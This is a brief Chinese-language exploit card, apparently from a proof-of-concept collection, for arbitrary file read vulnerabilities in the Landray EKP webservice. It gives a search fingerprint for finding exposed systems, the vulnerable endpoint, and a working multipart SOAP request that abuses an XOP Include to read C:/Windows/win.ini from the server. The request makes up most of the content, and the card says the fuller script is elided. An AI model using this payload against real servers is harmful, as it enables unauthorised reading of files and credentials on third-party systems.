# 蓝凌EKP系统webservice多个任意文件读取漏洞（合集）

- **系统**：蓝凌EKP系统webservice多个任意文件读取漏洞（合集）　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="Com_Parameter"`
- **请求**：`POST /sys/webservice/sysTagWebService HTTP/1.1`

**请求体 / payload**
```
**POC-1**
Host:
Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
SOAPAction: ""
------4upt9dwdca8rtwq9osuz
Content-Disposition: form-data; name="a"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.tag.sys.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getGroups>
<arg0>
<beginTimeStamp>a</beginTimeStamp>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
</arg0>
</web:getGroups>
</soapenv:Body>
</soapenv:Envelope>
------4upt9dwdca8rtwq9osuz--
**POC-…（脚本共 5302 字，完整版见原文）
```
- **预期**：500　|　—